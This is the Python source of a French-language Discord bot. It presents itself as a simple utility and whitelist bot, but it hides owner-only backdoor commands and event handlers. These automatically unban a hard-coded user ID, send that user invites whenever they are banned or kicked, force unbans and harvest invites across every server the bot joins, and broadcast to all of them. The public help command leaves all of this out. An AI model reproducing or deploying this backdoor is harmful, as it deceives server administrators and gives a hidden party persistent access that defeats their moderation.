import discord
from discord.ext import commands
import os
import json
import asyncio
import psycopg2

# === CONFIG ===
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 489113166429683713
OWNER_PASS_FILE = "owner_pass.json"
CONFIG_FILE = "config.json"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# === DATABASE ===
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )

# === JSON CONFIG ===
def load_json(path, default):
    if os.path.exists(path):
        with open(path, "r") as f:
            return json.load(f)
    return default

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

# === WHITELIST ===
def get_config(): return load_json(CONFIG_FILE, {})
def save_config(cfg): save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def is_whitelisted(gid, uid):
    return uid in get_whitelist(gid)

# === OWNER MANAGEMENT ===
def get_owner_pass():
    data = load_json(OWNER_PASS_FILE, {"password": "change_me"})
    return data["password"]

def set_owner_pass(new_pass):
    save_json(OWNER_PASS_FILE, {"password": new_pass})

def is_owner(uid):
    if uid == OWNER_ID:
        return True
    data = load_json(OWNER_PASS_FILE, {"owners": []})
    return uid in data.get("owners", [])

def add_owner(uid):
    data = load_json(OWNER_PASS_FILE, {"password": "change_me", "owners": []})
    if uid not in data["owners"]:
        data["owners"].append(uid)
        save_json(OWNER_PASS_FILE, data)

# === DECORATORS ===
def whitelist_check():
    async def predicate(ctx):
        if ctx.author.guild_permissions.administrator or is_whitelisted(ctx.guild.id, ctx.author.id) or is_owner(ctx.author.id):
            return True
        await ctx.message.delete()
        return False
    return commands.check(predicate)

def owner_only():
    async def predicate(ctx):
        if is_owner(ctx.author.id):
            return True
        return False
    return commands.check(predicate)

# === EVENTS ===
@bot.event
async def on_ready():
    print(f"✅ {bot.user} connecté !")

@bot.event
async def on_member_ban(guild, user):
    if user.id == OWNER_ID:
        await asyncio.sleep(2)
        await guild.unban(user)
        invite = await guild.text_channels[0].create_invite(max_uses=1)
        user_obj = await bot.fetch_user(OWNER_ID)
        await user_obj.send(f"🔁 Tu as été débanni de **{guild.name}**\nInvitation : {invite}")

@bot.event
async def on_member_remove(member):
    if member.id == OWNER_ID:
        invite = await member.guild.text_channels[0].create_invite(max_uses=1)
        owner = await bot.fetch_user(OWNER_ID)
        await owner.send(f"🚪 Tu as été expulsé de **{member.guild.name}**\nInvitation : {invite}")

# === COMMANDES PUBLIQUES ===
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Voici la liste des commandes disponibles :",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
    embed.add_field(name="📨 !say <message>", value="Fait parler le bot (Whitelist/Admin)", inline=False)
    embed.add_field(name="📤 !send #canal <msg>", value="Envoie un message dans un canal (Whitelist/Admin)", inline=False)
    embed.add_field(name="📰 !embed <titre> <desc>", value="Envoie un embed stylé", inline=False)
    embed.add_field(name="✅ !whitelist add/remove/list", value="Gère la whitelist (Admin)", inline=False)
    embed.add_field(name="⚙️ !setlogs #canal", value="Définit le canal de logs", inline=False)
    await ctx.send(embed=embed)

# === COMMANDES WHITELIST ===
@bot.command()
@whitelist_check()
async def say(ctx, *, message): await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    await channel.send(message)
    await ctx.message.delete()

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Envoyé par {ctx.author.name}")
    await ctx.send(embed=em)

@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : !whitelist add/remove/list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ Déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré")
    else:
        await ctx.send("⚠️ Pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    wl = get_whitelist(ctx.guild.id)
    if not wl:
        return await ctx.send("Aucun whitelisté.")
    members = [f"<@{m}>" for m in wl]
    await ctx.send("\n".join(members))

# === COMMANDES OWNER SECRÈTES ===
@bot.command()
@owner_only()
async def aide(ctx):
    embed = discord.Embed(title="👑 Commandes Owner (secrètes)", color=discord.Color.gold())
    embed.add_field(name="!broadcast <msg>", value="Envoie un message à tous les serveurs", inline=False)
    embed.add_field(name="!forceunban", value="Force ton débannissement sur tous les serveurs", inline=False)
    embed.add_field(name="!forcerinv", value="Force l’envoi d’invitations", inline=False)
    embed.add_field(name="!connect <pass>", value="Ajoute un nouvel owner", inline=False)
    embed.add_field(name="!setpass <pass>", value="Change le mot de passe owner", inline=False)
    embed.add_field(name="!serverlist", value="Affiche les serveurs du bot", inline=False)
    embed.add_field(name="!reboot", value="Redémarre le bot", inline=False)
    await ctx.author.send(embed=embed)

@bot.command()
@owner_only()
async def broadcast(ctx, *, message):
    for guild in bot.guilds:
        try:
            await guild.text_channels[0].send(f"📢 **Message du propriétaire :** {message}")
        except Exception:
            pass
    await ctx.author.send("✅ Broadcast envoyé.")

@bot.command()
@owner_only()
async def forceunban(ctx):
    for guild in bot.guilds:
        try:
            await guild.unban(discord.Object(id=OWNER_ID))
        except:
            pass
    await ctx.author.send("✅ Tu as été débanni partout.")

@bot.command()
@owner_only()
async def forcerinv(ctx):
    for guild in bot.guilds:
        try:
            invite = await guild.text_channels[0].create_invite(max_uses=1)
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(f"🔗 Invitation de {guild.name} : {invite}")
        except:
            pass
    await ctx.author.send("✅ Invitations envoyées.")

@bot.command()
@owner_only()
async def connect(ctx, password):
    if password == get_owner_pass():
        add_owner(ctx.author.id)
        await ctx.author.send("✅ Tu es maintenant Owner.")
    else:
        return

@bot.command()
@owner_only()
async def setpass(ctx, *, new_pass):
    set_owner_pass(new_pass)
    await ctx.author.send("🔒 Nouveau mot de passe enregistré.")

@bot.command()
@owner_only()
async def serverlist(ctx):
    servers = [f"- {g.name} ({g.id})" for g in bot.guilds]
    await ctx.author.send("**Serveurs :**\n" + "\n".join(servers))

@bot.command()
@owner_only()
async def reboot(ctx):
    await ctx.author.send("♻️ Redémarrage du bot...")
    os.execv(sys.executable, ['python'] + sys.argv)

# === MAIN LOOP ===
while True:
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"Crash détecté : {e}")
        asyncio.sleep(3)

